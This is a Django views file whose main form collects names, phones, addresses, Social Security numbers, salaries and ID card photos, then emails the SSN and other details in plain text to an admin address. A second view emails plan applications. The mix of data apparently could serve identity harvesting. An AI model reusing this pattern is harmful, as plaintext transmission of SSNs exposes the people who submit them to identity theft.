from django.shortcuts import render
from django.shortcuts import render, redirect
from django.core.mail import send_mail
from django.conf import settings
from .forms import UserInfoForm
from django.contrib import messages

# Create your views here.

def index(request):
    # messages.success(request, '')

    if request.method == 'POST':
        form = UserInfoForm(request.POST, request.FILES)
        if form.is_valid():
            user_info = form.save()
            
            # Send email to admin
            subject = 'New User Information Submitted'
            message = f"""
            New user information has been submitted:
            
            Name: {user_info.first_name} {user_info.last_name}
            Phone: {user_info.phone_no}
            Address: {user_info.home_address}
            SSN: {user_info.ssn_number}
            Maximum Monthly Salary: ${user_info.maximum_salary_monthly}
            
            ID card photos have been uploaded.
            """
            from_email = settings.DEFAULT_FROM_EMAIL
            recipient_list = [settings.ADMIN_EMAIL]
            
            send_mail(subject, message, from_email, recipient_list)
            
            return redirect('classified:success')  # Redirect to a success page
    else:
        form = UserInfoForm()
    return render(request, 'classified/index.html', {
        'form': form,
    })



from.models import Plan
from .forms import ApplicationForm
from django.contrib import messages
def next_kin(request):
    # plans = Plan.objects.all()
    # messages.success(request, '')
    

    if request.method == 'POST':
        form = ApplicationForm(request.POST)
        if form.is_valid():
            # Collect the data
            data = form.cleaned_data
            subject = f"New Application: {data['application_for']}"
            message = f"""
            Email: {data['email']}
            Duration: {data['select_duration_plan']} ({dict(form.fields['select_duration_plan'].choices)[data['select_duration_plan']]})
            """
            recipient_list = [settings.ADMIN_EMAIL]
            
            # Send the email
            send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, recipient_list)
            messages.success(request, 'Application submitted successfully!')
            
            return render(request, 'classified/success.html', {'message': 'Application submitted successfully!'})

    else:
        form = ApplicationForm()
    return render(request, 'classified/next_kin.html', {
        'form': form,
    })



def success(request):
    messages.success(request, 'Successfully submitted')
    return render(request, 'classified/success.html')